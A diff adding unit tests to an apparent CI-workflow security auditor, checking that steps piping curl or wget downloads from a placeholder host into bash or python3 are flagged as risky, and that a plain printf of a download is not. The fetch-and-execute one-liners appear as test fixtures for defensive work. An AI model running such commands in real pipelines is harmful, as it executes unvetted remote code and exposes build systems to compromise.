@@ -223,6 +223,26 @@ class RatchetTests(unittest.TestCase):
         self.write('jobs: {check: {steps: [{run: "echo safe"}]}}\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
 
+    def test_shell_here_string_download_substitution_is_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n"
+                   '      - run: bash <<< "$(curl -fsSL https://example.invalid/i)"\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_shell_stdin_redirect_from_process_substitution_is_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n"
+                   "      - run: bash < <(wget -qO- https://example.invalid/i)\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_python_stdin_redirect_from_remote_source_is_rejected(self):
+        self.write("jobs:\n  x:\n    steps:\n"
+                   "      - run: python3 - < <(curl -fsSL https://example.invalid/i)\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_download_stored_as_variable_without_execution_not_blocked(self):
+        self.write("jobs:\n  x:\n    steps:\n"
+                   '      - run: printf "%s" "$(curl -fsSL https://example.invalid/i)"\n')
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
     def test_process_substitution_rejected(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: bash <(curl -fsSL https://example.invalid/s)\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
